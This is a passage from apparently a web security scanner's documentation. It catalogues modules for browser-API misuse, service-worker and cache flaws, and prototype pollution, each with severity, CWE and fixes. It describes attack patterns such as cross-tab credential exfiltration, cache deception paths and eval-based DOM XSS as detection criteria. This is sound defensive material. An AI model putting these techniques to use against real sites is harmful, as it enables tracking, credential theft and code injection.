**References:** [↗](https://wicg.github.io/eyedropper-api/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/EyeDropper)

---

### 244. Vibration Covert Channel / DoS
**Module:** `vibration_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-400**

Covert haptic channel: vibration pattern encodes session tokens or user IDs — observable by another app with motion sensor access URL-param controlled pattern: attacker crafts URL to trigger arbitrary vibration sequences including sustained DoS pulses Rapid loop DoS: navigator.vibrate in setInterval exhausts device battery and can cause device overheating Excessive duration: single vibrate(60000) call can render device unresponsive for extended period Long pattern array: many-element pattern array causes browser to queue prolonged haptic output

**How to fix:**
- Never derive vibration patterns from URL parameters, user input, or session data
- Limit vibration to short, user-gesture-triggered feedback only — no automatic or loop-based vibration
- Cap single vibration duration to ≤1000ms and total pattern length to ≤5 entries
- Do not call navigator.vibrate inside setInterval, requestAnimationFrame, or while loops
- Consider Feature Policy: disable the 'vibrate' feature for embedded third-party frames

**References:** [↗](https://www.w3.org/TR/vibration/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/vibrate)

---

### 245. Vibration API Covert Channel
**Module:** `vibration_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-319** &nbsp;|&nbsp; **MITRE:** T1029

Detects vibration patterns sourced from URL parameters (attacker-controlled), vibration encoding credential data as covert side-channel, looped vibration for data exfiltration, and complex timing patterns for information encoding.

**How to fix:**
- Validate vibration pattern inputs — never source from URL parameters or user-controlled data
- Never use vibration patterns to encode credential or sensitive data (even indirectly)
- Avoid looped vibration calls — single short patterns for genuine UX use cases only

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Vibration_API) · [↗](https://cwe.mitre.org/data/definitions/319.html)

---

### 246. Window Management Screen Fingerprinting
**Module:** `window_management_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Multi-screen fingerprinting: getScreenDetails() reveals exact screen count, resolutions, and arrangement — unique device fingerprint Screen layout to analytics: screens array transmitted to analytics enables persistent device tracking across sessions Non-visible screen placement: window.open() with screen coordinates can place browser windows on secondary screens invisibly Screen arrangement inference: screen positions and labels reveal desk setup, work patterns, and hardware configuration Missing permission handling: NotAllowedError from getScreenDetails() must be caught — permission denied leaks silently

**How to fix:**
- Never transmit screen details, counts, or layouts to analytics or third-party endpoints
- Catch NotAllowedError from getScreenDetails() and degrade gracefully
- Declare the 'window-management' permissions policy header to restrict usage to specific origins
- When placing windows programmatically, validate coordinates stay within visible screen bounds
- Only request window-management permission after a user interaction that explicitly requires multi-screen functionality

**References:** [↗](https://www.w3.org/TR/window-management/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Window_Management_API)

---

### 247. Pointer Lock Security
**Module:** `pointer_lock_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Pointer Lock API misuse — movementX/Y mouse data transmitted to remote (behavioral surveillance), auto-lock on page load without explicit user action, continuous mousemove tracking with pointer lock (biometric fingerprinting).

**How to fix:**
- Do not transmit pointer lock movementX/Y data to remote analytics endpoints
- Only call requestPointerLock() in response to explicit user gestures, not on page load
- Avoid collecting continuous mousemove data streams during pointer lock for surveillance
- Disclose pointer lock usage and purpose to users in privacy policy

**References:** [↗](https://www.w3.org/TR/pointerlock/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 248. VirtualKeyboard API Security
**Module:** `virtual_keyboard_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Keyboard bounding rect transmitted for fingerprinting: on-screen keyboard dimensions reveal device type and platform overlaysContent=true near auth/login form: keyboard overlay used to obscure or phish credential input fields VirtualKeyboard API controlled from URL parameter: attacker-controlled keyboard visibility manipulation Keyboard inset dimensions used for device profiling: safe-area-like geometry fingerprints mobile device models

**References:** [↗](https://www.w3.org/TR/virtual-keyboard/) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 249. StorageManager Fingerprinting / Quota Probing
**Module:** `storage_manager_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Estimate exfiltration: storage quota/usage values transmitted to analytics — precise device storage fingerprint sent to third party Site-visit detection probe: quota usage delta computed to infer whether user has visited other sites — cross-site browsing history inference Auto-persist on load: storage.persist() called automatically — page silently requests permanent storage without user consent flow Quota disclosed to console: storage capacity logged — reveals device hardware profile to potential XSS attacker reading console Quota side-channel: application branches on remaining storage — attacker fills storage to manipulate application behaviour or detect fill level

**How to fix:**
- Never transmit storage estimate (quota/usage) to analytics or third-party endpoints
- Only call storage.persist() in response to an explicit user action (button click), not on page load
- Do not log storage quota/usage to console in production — this reveals device profile to potential XSS attackers
- Do not implement behaviour that depends on the exact remaining storage quota — it enables side-channel manipulation
- Partition storage (as modern browsers do) to limit cross-site storage side-channels

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/StorageManager) · [↗](https://storage.spec.whatwg.org/)

---

### 250. Web Locks API DoS Risk
**Module:** `lock_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-667**

Lock without AbortSignal: queued lock requests pile up if the holder crashes, exhausting browser resources steal:true: forcibly breaking locks can cause data corruption in concurrent IndexedDB or Cache API operations Lock name from URL input: attacker controls lock namespace, causing denial-of-service via lock contention Lock held in infinite loop: service worker or tab holding a lock indefinitely blocks all other requestors Lock state enumeration: locks.query() reveals application state machine details useful for timing attacks

**How to fix:**
- Always pass an AbortSignal to navigator.locks.request() with a timeout to prevent indefinite queuing
- Use steal:true only in explicit error recovery flows, never in normal operation paths
- Never derive lock names from URL parameters or user input — use application-defined constant names
- Ensure lock holders release the lock promptly — use try/finally to guarantee release even on error
- Prefer shared mode locks when exclusive access is not needed — reduces contention risk

**References:** [↗](https://w3c.github.io/web-locks/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_Locks_API)

---

### 251. Web Locks API Timing Oracle / Lock Abuse
**Module:** `web_locks_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-362**

Lock name from URL param: locks.request(URL_PARAM) allows attacker to acquire or block any named lock via URL manipulation Lock contention timing oracle: lock acquisition wait time measured and transmitted — reveals when other tabs are executing critical sections (cross-tab side-channel) Lock state exfiltrated: locks.query() result transmitted to remote — currently held/pending lock names reveal cross-tab application state Lock never released: lock acquired with never-resolving promise callback — application-wide named lock held indefinitely, causing deadlock or DoS for other tabs Sensitive data exfil in lock: credentials processed inside exclusive lock callback and transmitted — exfiltration inside serialized critical section evades some monitoring

**How to fix:**
- Never derive lock names from URL parameters — hardcode lock names or use client-generated nonces
- Do not measure lock acquisition timing and transmit externally — avoid lock-based timing side-channels
- Do not transmit locks.query() results to remote endpoints — cross-tab lock state is not intended to be shared externally
- Always ensure lock callbacks resolve their promise — add try/finally blocks to guarantee lock release
- Avoid processing authentication credentials inside lock callbacks that also make network requests

**References:** [↗](https://w3c.github.io/web-locks/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_Locks_API)

---

### 252. Notification Permission Spam / Data in Body
**Module:** `notification_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Auto permission request: Notification.requestPermission() on page load triggers browser prompt before user interacts — permission spam Sensitive content in body: notification body visible on device lock screen — password/token in body exposed to physical observers Attacker-controlled content: notification title/body derived from URL parameters enables notification injection attacks Click handler redirect: notification onclick navigates to URL from payload — open redirect via user-trusted notification Third-party notification access: analytics scripts requesting or creating notifications on behalf of the page

**How to fix:**
- Request notification permission only after user has explicitly opted in via a visible UI control
- Never include passwords, authentication tokens, card numbers, or session identifiers in notification body
- Sanitize all notification content from server push payloads — never embed URL parameters directly
- Validate notification click handler URLs against an allowlist before navigation
- Restrict Notification API from third-party frames via Permissions Policy header

**References:** [↗](https://www.w3.org/TR/notifications/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Notifications_API)

---

### 253. Web Badging API Count Injection / Surveillance
**Module:** `badging_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Badge count from URL param: setAppBadge(URL_PARAM) allows attacker to set arbitrary notification count — misleading badge number via URL crafting Badge reflects sensitive counts: badge displays auth/payment/invoice count — internal sensitive business data exposed on OS home screen/dock Auto-set on load: badge silently set on page load — notification count revealed without user interaction, fingerprinting timing of server response Count exfiltrated: badge count transmitted to analytics after set — notification count history sent to third-party analytics (activity fingerprinting) Server-controlled badge: server response controls badge count — malicious server can display false/alarming notification counts to manipulate user

**How to fix:**
- Never derive setAppBadge() count from URL parameters — compute badge count from local authenticated state only
- Do not use badge count to reflect authentication, payment, or security alert counts — use generic unread count only
- Only set badge in response to explicit user actions or authenticated push notifications
- Do not transmit badge count values to analytics endpoints
- Validate server response values before passing to setAppBadge() — sanitize and cap the count value

**References:** [↗](https://w3c.github.io/badging/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Badging_API)

---

### 254. Web Audio Fingerprinting / Mic Capture
**Module:** `web_audio_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

AudioContext fingerprinting: sampleRate, maxChannelCount, and timing characteristics uniquely identify GPU/audio hardware cross-site Covert mic processing: microphone stream routed to AudioContext for analysis without visible recording indicator AnalyserNode exfiltration: frequency domain data captures ambient audio characteristics for environment fingerprinting AudioBuffer channel data transmitted: raw PCM audio samples uploaded — voice recognition and acoustic inference possible Audio steganography: OscillatorNode with sensitive data context can encode secrets as inaudible ultrasonic tones

**How to fix:**
- Never transmit AudioContext sampleRate or hardware properties to analytics endpoints
- Only connect microphone streams to AudioContext in features with clear visual recording indicators
- Restrict microphone access via Permissions Policy and clearly display recording state to users
- Avoid transmitting AnalyserNode or AudioBuffer data to remote endpoints without explicit user consent
- Implement Content Security Policy to restrict which origins can receive audio data via fetch/XHR

**References:** [↗](https://www.w3.org/TR/webaudio/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API)

---

### 255. MediaCapabilities API Fingerprinting
**Module:** `media_capabilities_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

decodingInfo/encodingInfo results transmitted for fingerprinting: codec support matrix identifies device hardware Batch codec probes sent to remote: systematic enumeration of all supported codecs for comprehensive device profile Media capabilities query from URL parameter: attacker-controlled codec probe parameters smooth/powerEfficient/supported flags transmitted: hardware decoder state used as persistent cross-site identifier

**References:** [↗](https://www.w3.org/TR/media-capabilities/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 256. Media Session API Playback Tracking
**Module:** `media_session_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Metadata exfiltrated: media title/artist/album transmitted to analytics — detailed media consumption profile built and sent to third party Playback position tracked: setPositionState result transmitted — precise listening/viewing timeline including skip patterns sent to remote Metadata from URL param: MediaMetadata title/artist from searchParams — attacker controls what appears in OS lock screen or browser media UI (spoofing) Artwork SSRF: artwork URL from URL parameter — media session requests image from attacker-controlled URL (server-side or browser-side SSRF probe) Action handler telemetry: play/pause/seek action handlers transmit to analytics — every user media control action tracked and exfiltrated

**How to fix:**
- Do not transmit MediaMetadata title, artist, or album values to analytics without explicit user consent
- Do not transmit setPositionState values — playback position tracking is a significant privacy violation
- Never derive MediaMetadata fields from URL parameters — hardcode or fetch from authenticated API
- Restrict artwork URLs to same-origin or pre-approved CDN origins — never use URL parameter as artwork URL
- Avoid making network requests inside mediaSession.setActionHandler callbacks

**References:** [↗](https://w3c.github.io/mediasession/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/MediaSession)

---

### 257. Remote Playback API Security
**Module:** `remote_playback_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

remote.state transmitted to analytics: cast device playback state reveals user media consumption patterns watchAvailability() result exfiltrated: cast device availability reveals home network topology and smart TV presence remote.prompt() controlled by URL parameter: attacker-controlled screen casting target configuration remote.prompt() auto-triggered on page load: unprompted cast dialog shown without user interaction

**References:** [↗](https://w3c.github.io/remote-playback/) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 258. Picture In Picture Security
**Module:** `picture_in_picture_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-358**

Picture-in-Picture API misuse — requestPictureInPicture() triggered on page load without user gesture, PiP enter/leave events transmitted for media behaviour surveillance, PiP window dimensions used for screen fingerprinting, URL parameter controls PiP target.

**How to fix:**
- Only call requestPictureInPicture() from explicit user gesture event handlers
- Do not transmit PiP state change events to remote analytics
- Avoid using PictureInPictureWindow width/height for fingerprinting
- Never drive PiP target from URL parameters or user-controlled input

**References:** [↗](https://w3c.github.io/picture-in-picture/) · [↗](https://cwe.mitre.org/data/definitions/358.html)

---

### 259. BeforeInstallPrompt Deceptive Install Abuse
**Module:** `before_install_prompt_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-1021**

Auto-prompt on load: install dialog shown on DOMContentLoaded without user gesture — aggressive install solicitation violating browser intent Prompt from URL param: install dialog triggered by URL parameter — attacker forces install prompt by crafting a URL link Repeated prompt loop: prompt() re-called in setTimeout/setInterval — install harassment loop, re-prompting user repeatedly after dismiss Deceptive context: prompt shown labelled as 'download', 'security update', or 'required action' — social engineering PWA install as fake software Install choice exfiltrated: userChoice outcome (accepted/dismissed) sent to analytics — user's install decision tracked and transmitted

**How to fix:**
- Only call deferredPrompt.prompt() in response to explicit user gestures (e.g., button click)
- Never trigger install prompt from URL parameters — ignore searchParams when deciding to show prompt
- Do not re-prompt after user dismissal — respect the browser's rate-limiting intent
- Label install buttons honestly — do not mislabel as 'download', 'update', or 'security' buttons
- Do not transmit userChoice outcome to analytics endpoints

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/BeforeInstallPromptEvent) · [↗](https://web.dev/customize-install/)

---

### 260. Content Index API Sensitive Page Indexing
**Module:** `content_index_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-284**

Index entry from URL param: index.add() content from URL parameter — attacker adds arbitrary URLs to offline content index via link crafting Sensitive pages indexed: auth/payment/admin URLs in Content Index — pages requiring authentication made available without auth check in offline mode Content inventory exfiltrated: index.getAll() transmitted to remote — full list of indexed offline pages sent to server (reveals offline content configuration) Indexed URLs disclosed: URL values from getAll() transmitted — user's offline content URLs sent to analytics (navigation history fingerprinting) Cross-origin content indexed: index.add() with absolute external URL — content from other origins pulled into service worker offline cache

**How to fix:**
- Never derive index.add() content from URL parameters — hardcode or validate all content index entries against an allowlist
- Only index publicly accessible, non-authenticated content in the Content Index
- Do not transmit index.getAll() results to any remote endpoint
- Restrict Content Index to same-origin relative URLs — avoid absolute external URLs in index entries
- Audit all service worker Content Index registrations during security review

**References:** [↗](https://wicg.github.io/content-index/spec/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Content_Index_API)

---

### 261. Idle Detection API Privacy Risk
**Module:** `idle_detection_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Idle state transmitted to server: device presence/activity sent to backend enables employee monitoring, session recording, surveillance Short threshold (<60s): aggressive polling reveals fine-grained user activity patterns beyond spec intent No privacy notice: users unaware device idle detection is active — violates GDPR consent requirements for sensitive data Cross-tab correlation: idle state enables correlating multiple tabs/windows from same user for fingerprinting Session expiry bypass: idle detection used to extend session without real user activity verification

**How to fix:**
- Only request idle detection permission when the user explicitly requests a feature that needs it (e.g., 'enable away status')
- Display a clear privacy notice before calling IdleDetector.requestPermission() explaining what data is collected and why
- Never transmit idle/screen state to analytics or third-party services — keep it client-side only
- Set threshold at 60s minimum (W3C spec floor) and choose the highest threshold that meets your UX requirement
- Revoke idle detection permission and stop the detector when the user logs out or the feature is disabled

**References:** [↗](https://wicg.github.io/idle-detection/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Idle_Detection_API)

---

### 262. Compute Pressure Security
**Module:** `compute_pressure_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Compute Pressure API surveillance — CPU pressure state exfiltrated to server, activity inference via serious/critical threshold tied to auth/payment flow, continuous monitoring pattern.

**How to fix:**
- Do not transmit Compute Pressure state or factor values to remote analytics endpoints
- Avoid tying CPU pressure thresholds to sensitive user flows (auth, payments)
- Limit PressureObserver frequency — do not poll via setInterval or requestAnimationFrame
- Disclose Compute Pressure API usage in privacy policy if monitoring user system state

**References:** [↗](https://wicg.github.io/compute-pressure/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 263. Webgpu Security
**Module:** `webgpu_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

WebGPU API misuse — GPU adapter hardware fingerprinting, compute timing side channel, buffer data from URL parameters, compute results exfiltrated to remote endpoints.

**How to fix:**
- Do not transmit GPU adapter name, vendor, or limits to remote analytics endpoints
- Avoid using GPU compute timing as a side-channel oracle for cryptographic operations
- Sanitize URL parameter data before using as GPU buffer content
- Review WebGPU compute pipeline outputs for unintended data exfiltration

**References:** [↗](https://www.w3.org/TR/webgpu/) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 264. WebCodecs Timing / Decoder Injection
**Module:** `webcodecs_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-203**

Decode input from URL params: attacker-controlled codec input can trigger decoder crashes or memory corruption in native codec handlers Timing side-channel: measuring decode duration leaks information about media content through timing oracles SharedArrayBuffer with WebCodecs: enables Spectre-class cross-thread memory reads at high timer resolution Encoded output transmitted: A/V streams containing sensitive screen or microphone content silently exfiltrated Missing error handler: unhandled decoder errors can cause page crashes or silent data loss

**How to fix:**
- Never derive VideoDecoder input from URL parameters — validate and sanitize all codec input sources
- Avoid exposing encoded output to remote endpoints without explicit user consent and data classification review
- Use COOP/COEP headers to opt in to isolation before enabling SharedArrayBuffer with codec workloads
- Implement error: callbacks on all VideoDecoder/AudioDecoder instances
- Measure decode timing only in controlled environments — never transmit timing deltas to analytics endpoints

**References:** [↗](https://www.w3.org/TR/webcodecs/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/WebCodecs_API)

---

### 265. Screen Wake Lock Battery Drain / Activity Leak
**Module:** `screen_wake_lock_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-400**

Persistent screen-on: wake lock never released exhausts device battery and prevents automatic screen lock (security boundary) Auto-acquire on load: wake lock requested on page load without user interaction — prevents device sleep across sessions Loop re-acquisition: setInterval re-acquiring wake lock creates uninterruptible keep-alive — system resource abuse Activity inference: wake lock state transmitted to analytics reveals whether user is actively engaging with the page Missing visibility handler: wake lock persists when tab is hidden — device stays awake even when user switches apps

**How to fix:**
- Always release the wake lock sentinel when it is no longer needed (component unmount, task complete)
- Listen to document.addEventListener('visibilitychange') and release wake lock when document becomes hidden
- Only acquire wake lock in direct response to a user-initiated action (button click, form submit)
- Avoid re-acquiring wake lock inside setInterval or requestAnimationFrame
- Do not transmit wake lock status to analytics endpoints

**References:** [↗](https://www.w3.org/TR/screen-wake-lock/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Screen_Wake_Lock_API)

---

## Service Workers & Caching

*9 scanners in this category.*

### 266. Worker Module Security
**Module:** `worker_module_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-94**

Worker Module misuse — Worker/SharedWorker URL from URL parameter (attacker-controlled worker code execution), worker loaded from external domain (third-party code in worker context), importScripts() URL from URL parameter (script injection into worker), worker.postMessage() sends credentials to worker.

**How to fix:**
- Never construct Worker or SharedWorker URLs from URL parameters or user-controlled input
- Restrict worker script loading to same-origin resources only via CSP worker-src
- Do not pass URL parameter values to importScripts() inside workers
- Avoid transmitting credentials, tokens, or passwords via worker.postMessage()

**References:** [↗](https://html.spec.whatwg.org/multipage/workers.html) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 267. Service Worker Security Risk
**Module:** `service_worker_security_deep` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-923**

skipWaiting + fetch intercept: new service worker activates immediately, can serve stale or attacker-modified cached responses to users without reload message handler without origin check: malicious pages send arbitrary commands to service worker, manipulating cached resources Auth tokens cached in service worker: session credentials persist in Cache Storage across logout — cleartext token recovery after session ends eval() in service worker: code injection into SW execution context bypasses CSP and executes with page origin trust HTTP importScripts(): MITM attack on SW dependency fetch replaces worker script with attacker-controlled code

**How to fix:**
- Avoid skipWaiting() unless you have a clear user-visible reload UX — stale SW can serve outdated security patches
- Always check event.origin in service worker message handlers before processing event.data
- Never cache authentication headers, tokens, or credentials in Cache Storage — use short-lived session cookies instead
- Include a strict CSP on service worker responses: disallow eval and restrict importScripts to same origin only
- Serve service worker scripts over HTTPS with strong caching headers and Subresource Integrity on imported scripts

**References:** [↗](https://w3c.github.io/ServiceWorker/) · [↗](https://owasp.org/www-project-web-security-testing-guide/)

---

### 268. SharedWorker Cross-Tab Data Exposure
**Module:** `shared_worker_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-668**

Worker URL from URL param: new SharedWorker(searchParams.get('worker')) loads attacker-controlled script — arbitrary code execution in shared worker scope Sensitive global state: auth tokens or API keys stored in SharedWorker global scope shared across all connected tabs — any tab can read the credentials Broadcasts sensitive data: SharedWorker posts auth tokens to all connected ports — every open browser tab receives the credentials Aggregates and exfiltrates: SharedWorker collects data from multiple client tabs and transmits as an aggregate — cross-tab user behaviour exfiltration No origin check on connect: onconnect handler processes all clients without origin validation — cross-origin pages sharing the same worker can inject messages

**How to fix:**
- Never derive SharedWorker URL from URL parameters — hardcode the worker script path
- Do not store authentication tokens or API keys in SharedWorker global scope
- Validate event.origin in the onconnect handler before accepting a new port connection
- Use unique nonces or tokens per-tab to prevent cross-tab credential sharing via SharedWorker
- Prefer DedicatedWorker over SharedWorker when cross-tab sharing is not required

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/SharedWorker) · [↗](https://html.spec.whatwg.org/multipage/workers.html)

---

### 269. Web Worker Security Misconfiguration
**Module:** `web_worker_security_deep` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-668**

SharedArrayBuffer without COOP+COEP: enables Spectre-class timing attacks to read cross-origin memory Atomics.wait abuse: high-resolution timer reconstructed via shared memory enables cache timing attacks External importScripts(): CDN compromise executes arbitrary code in Worker with access to all messages postMessage('*'): sensitive data in Worker messages sent to any window on any origin Worker URL from URL param: attacker-controlled worker script — arbitrary code execution in worker context

**How to fix:**
- Set Cross-Origin-Opener-Policy: same-origin and Cross-Origin-Embedder-Policy: require-corp before using SharedArrayBuffer
- Never import external scripts in Workers; bundle required code at build time
- Specify explicit targetOrigin in postMessage() calls — never use '*' for sensitive messages
- Validate and restrict Worker script URLs to same-origin or known paths
- Implement Content-Security-Policy: worker-src 'self' to restrict Worker source origins

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/SharedArrayBuffer)

---

### 270. Prerendering Security
**Module:** `prerendering_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Prerendering misuse — network/storage operations triggered while document.prerendering=true (premature data exposure in prerender phase), prerender/speculation rules URL from URL parameter (attacker-controlled prerender target), prerenderingchange event transmits data to remote, ActivationStart timing fingerprinting.

**How to fix:**
- Defer all network requests, analytics, and storage writes until prerenderingchange fires (prerendering=false)
- Never source prerender target URLs from URL parameters or user-controlled input
- Do not transmit prerenderingchange event timing data to remote analytics
- Audit speculation rules JSON for externally-controlled URL sources

**References:** [↗](https://wicg.github.io/nav-speculation/prerendering.html) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 271. Cache Poisoning Risk
**Module:** `cache_poisoning_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-524**

Host header reflected in cached responses allows poisoning CDN cache with malicious URLs Missing Vary header causes CDN to serve responses crafted for one origin to all users Age header without Cache-Control exposes internal cache topology

**How to fix:**
- Never reflect arbitrary Host header values into responses — use a configured canonical hostname
- Set Vary: Origin, Host on all responses with dynamic content
- Require Cache-Control: no-store on sensitive authenticated pages

---

### 272. Web Cache Deception
**Module:** `web_cache_deception` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-525**

Authenticated account pages cached by CDN and served to other users Path confusion (/account/profile.css) tricks CDN into caching private pages

**How to fix:**
- Set Cache-Control: no-store, private on all authenticated pages
- Configure CDN to respect Cache-Control headers and never cache private content

---

### 273. BFCache Auth State Leakage
**Module:** `back_forward_cache_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-613**

Stale auth token restored: session token re-used from localStorage on pageshow persisted without re-validation — expired or revoked session accepted Auth page in BFCache: login/logout page survives in bfcache — shared computer scenario exposes authenticated session via back-button Form value restoration: password or sensitive form field value restored from cached DOM on bfcache restore Sensitive variables not cleared: auth tokens in global scope persist in memory during BFCache window — accessible to future page activations Back-button navigation tracking: getEntriesByType('navigation') used to detect BFCache restore and send to analytics — user navigation behaviour surveillance

**How to fix:**
- Set Cache-Control: no-store on authenticated pages to opt out of BFCache
- On pageshow with event.persisted=true, re-validate session server-side before continuing
- Clear sensitive variables in pagehide handler before BFCache snapshot
- Reset and clear form fields in pageshow handler after BFCache restore
- Do not transmit navigation type (back_forward) to analytics — it reveals browsing behaviour

**References:** [↗](https://web.dev/bfcache/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Window/pageshow_event)

---

### 274. Speculation Rules Security Issues
**Module:** `speculation_rules_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Wildcard href_matches (*) causes browser to speculatively prefetch ALL links including logout, delete, and state-change GET endpoints Sensitive URL paths (admin, checkout, login) in speculation rules trigger credentialed prefetch requests before user interaction Eager/immediate prerender executes page scripts and fires analytics beacons for pages the user never visits Speculation-Rules HTTP header reveals high-priority URL targets to attackers, providing a partial site map Speculation rules combined with No-Vary-Search can cause cache confusion — different URLs served the same cached response

**How to fix:**
- Scope speculation rules to safe, non-sensitive URL prefixes (e.g., /blog/, /docs/) only
- Exclude logout, delete, admin, checkout, and payment paths from all speculation rules
- Use 'moderate' or 'conservative' eagerness for prerender entries; avoid 'eager' and 'immediate'
- Serve speculation rules inline via <script type='speculationrules'> rather than via HTTP header
- Audit No-Vary-Search directives when combined with speculation rules to prevent cache confusion

---

## JavaScript & Prototype

*23 scanners in this category.*

### 275. Function Constructor / eval Code Injection
**Module:** `function_constructor_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-95** &nbsp;|&nbsp; **MITRE:** T1059.007

Detects new Function() and eval() receiving URL parameter input (DOM XSS via dynamic code execution), Function body containing credentials, and setTimeout() with string arguments containing URL parameters (implicit eval).

**How to fix:**
- Never pass URL parameters or user input to new Function() or eval()
- Replace eval() with safer alternatives (JSON.parse for data, explicit function calls for logic)
- Use function references instead of string arguments in setTimeout()/setInterval()
- Implement a strict Content Security Policy that blocks eval (unsafe-eval)

**References:** [↗](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) · [↗](https://cwe.mitre.org/data/definitions/95.html)

---

### 276. Advanced Prototype Pollution
**Module:** `prototype_pollution_advanced` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-1321** &nbsp;|&nbsp; **MITRE:** T1059

Detects deep prototype chain pollution patterns including __proto__ or Object.setPrototypeOf() receiving URL parameter/JSON.parse values, Object.assign() merging user-controlled data (enabling __proto__ key injection), Object.defineProperty() with attacker-controlled descriptor, and bracket notation prototype writes from user input.

**How to fix:**
- Use Object.create(null) for configuration objects to break prototype chain
- Validate and sanitize JSON input with allowlisted keys before Object.assign/spread
- Use JSON.parse with a reviver function that blocks __proto__ and constructor keys
- Consider using frozen objects (Object.freeze) for sensitive configuration

**References:** [↗](https://portswigger.net/web-security/prototype-pollution) · [↗](https://cwe.mitre.org/data/definitions/1321.html)

---

### 277. JavaScript Prototype Chain Manipulation
**Module:** `javascript_prototype_chain` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-915** &nbsp;|&nbsp; **MITRE:** T1059

Detects patterns enabling prototype pollution and prototype chain exploitation: direct __proto__ assignment, Object.prototype property modification, bracket notation prototype writes from URL parameters, Object.setPrototypeOf with user-controlled inputs, hasOwnProperty overrides, and Object.defineProperty gadgets on Object.prototype that trigger code execution.

**How to fix:**
- Use Object.create(null) for dictionaries that accept user-controlled keys to avoid prototype chain
- Validate and reject keys named __proto__, constructor, or prototype before merging objects
- Use JSON schema validation to allowlist expected properties from user input
- Freeze Object.prototype in security-critical environments: Object.freeze(Object.prototype)

**References:** [↗](https://portswigger.net/web-security/prototype-pollution) · [↗](https://cwe.mitre.org/data/definitions/915.html)

---

### 278. Dangerous JavaScript Patterns (DOM XSS)
**Module:** `js_dangerous_patterns` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

eval(location.*) executes attacker-controlled URL fragment or query parameters as code — direct DOM XSS innerHTML assigned from location.hash/search/href writes attacker HTML directly into the DOM document.write() with URL-derived data injects arbitrary HTML including scripts new Function() and setTimeout/setInterval with string arguments function as eval() alternatives postMessage listeners without event.origin checks accept messages from any cross-origin frame Dynamic script elements loaded without integrity attribute are vulnerable to CDN compromise

**How to fix:**
- Replace eval(tainted) with safe parsers (JSON.parse, parseInt) or sandboxed iframes
- Replace innerHTML/document.write with textContent or DOM APIs (createElement, appendChild)
- Add event.origin checks to all postMessage listeners; reject messages from untrusted origins
- Add integrity (SRI) and crossorigin attributes to all dynamically-created script elements
- Enable Trusted Types CSP policy to enforce safe DOM manipulation patterns

---

### 279. Object.defineProperty Security
**Module:** `define_property_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

